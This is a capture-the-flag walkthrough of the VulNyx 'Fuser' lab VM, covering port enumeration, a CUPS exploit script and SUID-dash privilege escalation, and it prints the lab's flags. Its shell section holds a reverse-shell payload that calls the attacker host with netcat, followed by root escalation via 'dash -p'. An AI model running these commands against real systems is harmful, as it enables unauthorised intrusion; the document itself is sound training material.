# VulNyx - Fuser

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.11.23               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 15:18 +07
Nmap scan report for 192.168.11.23
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html).
631/tcp open  ipp     CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Inicio - CUPS 2.3.3op2
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:78:21:95 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.33 seconds
```
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.23/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.23/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 48855 / 220557 (22.15%)[ERROR] error on word blglossary: timeout occurred during the request
/server-status        (Status: 403) [Size: 278]
Progress: 140563 / 220557 (63.73%)[ERROR] error on word Nagasaki: timeout occurred during the request
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

#### Browser web
![web](/walkthroughs/vulnyx/low-difficulty/25_fuser/web.png)

![web port 631](/walkthroughs/vulnyx/low-difficulty/25_fuser/web-631.png)

### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ python exploit_evilcups.py 192.168.11.10 192.168.11.23 "nc 192.168.11.10 4444 -e /bin/sh"
IPP Server Listening on ('192.168.11.10', 12345)
Sending udp packet to 192.168.11.23:631...
Please wait this normally takes 30 seconds...
0 elapsed
target connected, sending payload ...
106 elapsed
```
![printer1](/walkthroughs/vulnyx/low-difficulty/25_fuser/printer1.png)
![printer2](/walkthroughs/vulnyx/low-difficulty/25_fuser/printer2.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.22] 59510
id ; hostname
uid=7(lp) gid=7(lp) groups=7(lp)
fuser
```

```bash
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
lp@fuser:/$ ls
ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
lp@fuser:/$ 
```
### Privilege Escalation
#### Enumeration
```bash
lp@fuser:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/dash
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

#### Abuse
```bash
lp@fuser:/$ usr/bin/dash -p
usr/bin/dash -p
# id; hostname
id; hostname
uid=7(lp) gid=7(lp) euid=0(root) groups=7(lp)
fuser
```

#### Flags
```bash
# find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
fe82ce45606fc67448677e4218931a77
523ac6c4f33201cec8e933042dd37ba6
```
***You are welcome!***
